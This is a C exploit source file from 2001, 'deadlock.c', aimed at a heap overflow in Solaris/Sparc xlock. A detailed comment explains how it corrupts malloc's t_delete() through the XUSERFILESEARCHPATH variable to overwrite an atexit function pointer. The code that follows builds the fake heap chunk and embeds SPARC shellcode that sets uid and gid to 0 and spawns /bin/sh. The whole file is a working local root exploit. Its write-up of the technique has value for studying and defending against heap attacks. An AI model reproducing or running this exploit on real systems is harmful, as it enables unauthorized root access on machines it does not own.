/*
 * Created: August 18, 2001
 * Updated: September 4, 2001
 *   ______
 *  /   ___\ __ _  ____  ____  ____ ____ ____  __ _
 *  \____  \/  / \/    \/    \/  _ \    \ _  \/  / \
 * /        \___  \  \  \  \  \ ___/  \_/___  \___  \
 * \______  / ____/__/  /__/  /___ \__/ / ____/ ____/
 *        \/\/        \/    \/    \/    \/    \/
 *
 * deadlock.c versus Solaris/Sparc xlock
 * THIS IS UNPUBLISHED PROPRIETARY SOURCE CODE OF SYNNERGY
 * Copyright (C) 2001 MaXX <maxx@synnergy.net>
 *
 * "NSFOCUS Security Team has found a heap buffer overflow vulnerability
 * in the xlock shipped in Solaris system when handling some environment
 * variables." deadlock.c is another version of the exploit provided by
 * NSFOCUS, since I wanted to understand how the malloc implementation
 * used by Solaris worked, and since the algorithm used by NSFOCUS in
 * order to compute the address of the shellcode stored on the stack was
 * not reliable (indeed, it did not work on every Solaris/Sparc box I
 * had access to).
 *
 * $ XUSERFILESEARCHPATH=`perl -e 'print "B" x 1337'` /usr/openwin/bin/xlock
 * Bus Error
 *
 * deadlock.c tricks malloc into processing a fake chunk of memory with
 * the internal t_delete() function, and therefore overwrites a function
 * pointer with the address of a shellcode stored on the stack (or more
 * exactly, with the address of a backward call instruction stored at
 * the end of the shellcode).
 *
 * The function pointer overwritten here is the first entry of the
 * exitfns[] array, which contains the addresses of the functions
 * registered via atexit() and to be called at the end of the program
 * (indeed, there is no GOT or .dtors section on Solaris/Sparc):
 *
 * $ gdb xlock
 * (gdb) break main
 * (gdb) run
 * (gdb) p &exitfns
 * 0xff13824c
 *
 * If anybody knows how to find out where the libc is mapped during the
 * execution of a Solaris/Sparc program, please let me know so I do not
 * have to rely on gdb in order to find out the address of exitfns[]. Of
 * course, a saved pc could also be overwritten on the stack, but its
 * address is much more difficult to find out without brute force (as a
 * side note, do not forget to subtract 8 bytes from the code address
 * when overwriting a saved pc, since 8 bytes are added to the saved pc
 * after it was popped and before it is executed).
 *
 * In order to reliably compute the address of the shellcode stored
 * on the stack, the exploit (not xlock) is executed again and again
 * (with the very same argv[] and envp[] arrays that will be passed
 * to xlock) until the address of the shellcode is a multiple of 4
 * bytes (mandatory for instructions on Sparc architectures) and does
 * not contain NUL bytes. The length of the exploit filename should
 * therefore be equal to the length of the xlock filename (if xlock is
 * /usr/openwin/bin/xlock, the exploit can be /tmp/xxxxxxxxxxxxxxxxx).
 *
 * In order to trick malloc into processing a fake boundary tag with
 * t_delete(), the t_s field of the already freed (but not realfreed)
 * chunk of memory located immediately after the end of the overflowed
 * buffer is overwritten. When this corrupted chunk is processed by
 * realfree():
 *
 * [...]
 *     if ( !ISBIT0(ts) )
 *         return;
 *
 * Since the BIT0 of the overwritten t_s field was set, realfree() does
 * not return.
 *
 *     CLRBITS01( SIZE(tp) );
 *
 * The 2 LSBs of t_s are now cleared.
 *
 * [...]
 *     np = NEXT( tp );
 *
 * Since t_s is equal to -8, np points back to tp.
 *
 *     if ( !ISBIT0(SIZE(np)) ) {
 *
 * Since the 2 LSBs of t_s (SIZE(np)) were cleared, the next
 * instructions are carried out.
 *
 *         if ( np != Bottom )
 *             t_delete( np );
 *
 * The fake chunk of memory is processed by t_delete().. since t_l is
 * equal to -1, the very first block of instructions within t_delete()
 * is carried out, and the function pointer (stored in the t_n field)
 * is overwritten with the shellcode address (stored in the t_p field..
 * we could also store the shellcode address in the t_n field and
 * the function pointer in the t_p field, but the 4 bytes stored at
 * (t_n + 8) would therefore be overwritten with garbage bytes, and
 * unfortunately, when overwriting a saved pc on the stack with t_n,
 * these 4 garbage bytes would be the first executed).
 *
 * Thanks to NSFOCUS for the discovery of the hole, for the first
 * exploit, and the interesting ideas about how to compute the address
 * of the shellcode, thanks to anonymous for his paper about System V
 * malloc implementation, and thanks to Scrippie for his proposition
 * related to Solaris/Sparc malloc ;)
 *
 * -- MaXX
 */

#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define ALIGNMENT 4
#define SHELLCODE_KEY "SHELLCODE"
#define BUFFER_KEY "XUSERFILESEARCHPATH"
#define BUFFER_SIZE 1024
#define DUMMY_ALIGNMENT ""
#define DUMMY_BYTE 0x42
#define CODE_ADDRESS 0xdefaced
#define FUNCTION_POINTER 0xff13824c
#define XLOCK "/usr/openwin/bin/xlock"

#define WORDSIZE sizeof(WORD)
#define ALIGN 8
typedef union _w_ {
    size_t w_i;
    struct _t_ * w_p;
    char w_a[ ALIGN ];
} WORD;
typedef struct _t_ {
    WORD t_s;
    WORD t_p;
    WORD t_l;
    WORD t_r;
    WORD t_n;
    WORD t_d;
} TREE;
#define SIZE( b ) ( ((b)->t_s).w_i )
#define LEFT( b ) ( ((b)->t_l).w_p )
#define LINKFOR( b ) ( ((b)->t_n).w_p )
#define LINKBAK( b ) ( ((b)->t_p).w_p )
#define SETNOTREE( b ) ( LEFT(b) = (TREE *)(-1) )
#define BIT0 (01)
#define BIT1 (02)

#define SHELLCODE \
    /* setuid( 0 ); */ \
    "\x92\x1a\x40\x09\x90\x12\x40\x09\x82\x10\x20\x17\x91\xd0\x20\x08" \
    /* setgid( 0 ); */ \
    "\x92\x1a\x40\x09\x90\x12\x40\x09\x82\x10\x20\x2e\x91\xd0\x20\x08" \
    /* execve( "/bin/sh", {"/bin/sh", NULL}, NULL ); */ \
    "\x31\x0b\xd8\x9a\xb0\x16\x21\x6e\x33\x0b\xdc\xda\x90\x13\x80\x0e" \
    "\x92\x03\xa0\x08\x94\x1b\x80\x0e\x9c\x03\xa0\x10\xf0\x23\xbf\xf0" \
    "\xf2\x23\xbf\xf4\xd0\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b" \
    "\x91\xd0\x20\x08\x90\x10\x20\x2a\x82\x10\x20\x01\x91\xd0\x20\x08" \
    /* call */ \
    "\x7f\xff\xff\xe8\x01nop"
#define CALL_SIZE 8

/* alignment() */
int alignment( void * pointer )
{
    return( (size_t)pointer % ALIGNMENT );
}

/* nul() */
int nul( void * pointer )
{
    int i;

    for ( i = 0; i < sizeof(pointer); i++ ) {
        if ( ((char *)(&pointer))[i] == '\0' ) {
            return( -1 );
        }
    }
    return( 0 );
}

/* main() */
int main( int argc, char * argv[], char * envp[] )
{
    char * p_shellcode;

    p_shellcode = getenv( SHELLCODE_KEY );
    if ( p_shellcode == NULL ) {
        TREE tree;
        char buffer[ sizeof(BUFFER_KEY) + BUFFER_SIZE + sizeof(TREE) + 1 ];
        char * p_buffer;
        char * execve_argv[] = { NULL, NULL };
        char * execve_envp[] =
            { DUMMY_ALIGNMENT, SHELLCODE_KEY"="SHELLCODE, buffer, NULL };

        memset( &tree, DUMMY_BYTE, sizeof(TREE) );
        SIZE( &tree ) = (size_t)( (-WORDSIZE | BIT0) & ~BIT1 );
        LINKBAK( &tree ) = (TREE *)( CODE_ADDRESS );
        SETNOTREE( &tree );
        LINKFOR( &tree ) = (TREE *)( FUNCTION_POINTER - offsetof(TREE,t_p) );

        p_buffer = buffer;
        memcpy( p_buffer, BUFFER_KEY"=", sizeof(BUFFER_KEY) );
        p_buffer += sizeof(BUFFER_KEY);
        memset( p_buffer, DUMMY_BYTE, BUFFER_SIZE );
        p_buffer += BUFFER_SIZE;
        memcpy( p_buffer, &tree, sizeof(TREE) );
        p_buffer += sizeof(TREE);
        *p_buffer = '\0';

        execve_argv[ 0 ] = argv[ 0 ];
        execve( execve_argv[0], execve_argv, execve_envp );
        return( -1 );
    } else {
        p_shellcode += strlen( p_shellcode ) - CALL_SIZE;
        if ( alignment(p_shellcode) || nul(p_shellcode) ) {
            size_t size;
            char * p_alignment;

            size = strlen( envp[0] ) + 1;
            p_alignment = malloc( size + 1 );
            if ( p_alignment == NULL ) {
                return( -1 );
            }
            memset( p_alignment, DUMMY_BYTE, size );
            p_alignment[ size ] = '\0';
            envp[ 0 ] = p_alignment;

            execve( argv[0], argv, envp );
            return( -1 );
        } else {
            char * p_linkbak;

            p_linkbak = getenv(BUFFER_KEY) + BUFFER_SIZE + offsetof(TREE,t_p);
            memcpy( p_linkbak, &p_shellcode, sizeof(p_shellcode) );

            argv[ 0 ] = XLOCK;
            execve( argv[0], argv, envp );
            return( -1 );
        }
    }
    return( -1 );
}

